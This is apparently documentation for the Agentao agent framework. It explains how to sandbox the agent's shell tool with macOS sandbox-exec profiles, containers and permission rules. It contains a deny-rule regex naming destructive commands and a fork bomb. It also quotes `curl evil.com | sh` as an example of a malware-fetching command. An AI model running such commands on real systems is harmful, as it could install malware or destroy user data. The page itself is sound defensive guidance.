# 6.2 Shell Sandbox & Command Control

`run_shell_command` is Agentao's most capable — and most dangerous — tool. Agentao provides **three progressive defenses**, ranked cheap-to-expensive:

```
Layer A · PermissionEngine   (always on)
  └─ rule-based allow / deny / ask
Layer B · confirm_tool        (interactive scenarios)
  └─ user approves / rejects
Layer C · macOS sandbox-exec  (off by default; explicit enable)
  └─ kernel-level file / network isolation
```

A and B are covered in [Part 4.5](/en/part-4/5-tool-confirmation-ui) and [Part 5.4](/en/part-5/4-permissions). This section focuses on **Layer C: system-level sandbox**.

## macOS sandbox-exec

Source: `agentao/sandbox/policy.py`, `agentao/sandbox/profiles/`

macOS ships with `sandbox-exec`, a kernel-level isolator for file writes and network. Agentao's `SandboxPolicy` wraps shell commands with it when enabled.

### Three built-in profiles

| Profile | File writes | Network | Use case |
|---------|-------------|---------|----------|
| `readonly` | ❌ | ❌ | Pure read analysis, audits |
| `workspace-write-no-network` | `_RW1` only | ❌ | Code editing without net |
| `workspace-write` | `_RW1` only | ✅ | Default for dev |

`_RW1` is a sandbox-profile variable for "the writable path"; Agentao passes `workspace_root` (defaults to the project root).

## Enabling it

### Minimum config

In `~/.agentao/sandbox.json` or `<project>/.agentao/sandbox.json`:

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network"
}
```

After restart, every `run_shell_command` runs through sandbox-exec. On non-macOS (no `sandbox-exec`), the sandbox **silently degrades to off** — a potential security risk discussed in "Cross-platform notes".

### Different profiles per tool

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network",
  "rules": [
    {"tool": "run_shell_command", "profile": "workspace-write"}
  ]
}
```

Current rule matching is by `tool` name only; future versions may route by command content.

### Runtime toggle

```python
from agentao.sandbox import SandboxPolicy

policy = SandboxPolicy(project_root=Path("/data/tenant-a"))
policy.set_enabled(True)
policy.set_default_profile("workspace-write-no-network")
# Inject into the agent (currently via ToolRunner plumbing)
```

## Custom profiles

Drop `.sb` files under `profiles_dir`:

```json
{
  "enabled": true,
  "profiles_dir": "./sandbox-profiles",
  "default_profile": "my-strict"
}
```

`./sandbox-profiles/my-strict.sb`:

```scheme
(version 1)
(deny default)
(allow process-fork)
(allow process-exec)
(allow signal (target self))

;; Read access to project root only
(allow file-read* (subpath (param "_RW1")))
(allow file-read* (subpath "/usr"))
(allow file-read* (subpath "/Library"))
(allow file-read* (literal "/dev/null"))

;; Write access to a single subdir only
(allow file-write* (subpath (string-append (param "_RW1") "/tmp")))

;; Absolutely no network
(deny network*)
```

**Profile syntax**: TinyScheme subset. See Apple's [Sandbox documentation](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/) or `/System/Library/Sandbox/Profiles/*.sb` for examples.

## Fail-closed semantics

Agentao's sandbox policy is **strictly fail-closed** — misconfiguration refuses execution, never silently degrades:

| Error | Behavior |
|-------|----------|
| `sandbox.json` JSON parse error | On macOS: raises `SandboxMisconfiguredError`; off macOS: sandbox not applied |
| Referenced profile name not found | Raises `SandboxMisconfiguredError`; command refuses |
| `sandbox-exec` not on PATH | Treated as unsupported; macOS-only matters |
| Profile syntax error (Scheme) | `profile_health_error()` reports on `SandboxPolicy` construction; health check rejects |

**Meaning**: with `enabled=true`, any misconfig **fully disables** the shell tool — intentional, better than silently stripping protection.

## Cross-platform notes

| OS | sandbox-exec available | Suggestion |
|----|------------------------|------------|
| macOS 13+ | ✅ | Use directly |
| Linux | ❌ | Use container / namespaces / seccomp (below) |
| Windows | ❌ | WSL2 / Docker Desktop |

Linux has **no built-in equivalent**. Alternatives:

**Approach 1 · Container isolation**

Run the entire agent in Docker with a read-only root + volume allowlist:

```bash
docker run --rm \
  --read-only \
  --tmpfs /tmp \
  -v $(pwd):/workspace \
  --network=none \
  -e OPENAI_API_KEY=$OPENAI_API_KEY \
  your-agent-image
```

**Approach 2 · firejail / bwrap**

Wrap `run_shell_command` in a lightweight sandbox. Not built in — customize `ShellTool`:

```python
from agentao.tools.shell import ShellTool
import shlex

class FirejailShellTool(ShellTool):
    def execute(self, command: str, **kw) -> str:
        wrapped = ["firejail", "--private=/tmp/sb", "--"] + shlex.split(command)
        return super().execute(
            command=" ".join(shlex.quote(a) for a in wrapped), **kw
        )
```

**Approach 3 · Cloud-platform isolation**

Run the agent in gVisor / Kata Containers / AWS Lambda — stronger-isolation environments.

## When is the sandbox worth enabling?

| Scenario | Enable? |
|----------|---------|
| Developer using Agentao CLI locally | Optional (enable for safety) |
| Embedded in your personal SaaS (single tenant) | **Yes** |
| Multi-tenant SaaS (high risk) | **Yes + container isolation, belt + suspenders** |
| Trusted internal tool | Optional |
| CI with an LLM | **Must** (CI shouldn't run arbitrary commands anyway) |

## Beyond the sandbox: command filtering

Even with sandbox on, always filter command strings at the permission layer first:

```json
{
  "rules": [
    {"tool": "run_shell_command", "args": {"command": "rm\\s+-rf|sudo|:\\(\\)\\{.*:|;.*:&"}, "action": "deny"},
    {"tool": "run_shell_command", "args": {"command": "^(git|ls|cat|grep) "}, "action": "allow"},
    {"tool": "run_shell_command", "action": "ask"}
  ]
}
```

Sandbox stops "kernel-level damage from the command"; permissions stop "the command shouldn't run at all". Layer both.

## Common pitfalls

### ❌ Only sandboxing, no rule filtering

Sandbox blocks `rm -rf /`, but it does **not** block `curl evil.com | sh` that downloads malware into the workspace and runs it. Rules stop that.

### ❌ Not validating custom profiles

Ship an untested profile → a single TinyScheme syntax error breaks every command. Always health-check before deploying:

```python
policy = SandboxPolicy(project_root=Path.cwd())
err = policy.profile_health_error("my-strict")
assert err is None, f"Profile broken: {err}"
```

### ❌ `_RW1` points to the wrong place

Sandbox only allows writes under `_RW1`. If you expect the agent to write `/tmp/output`, either allow it in the profile or change `workspace_root`. Default: `workspace_root = project root`.

→ [6.3 Network & SSRF Defense](./3-network-ssrf)
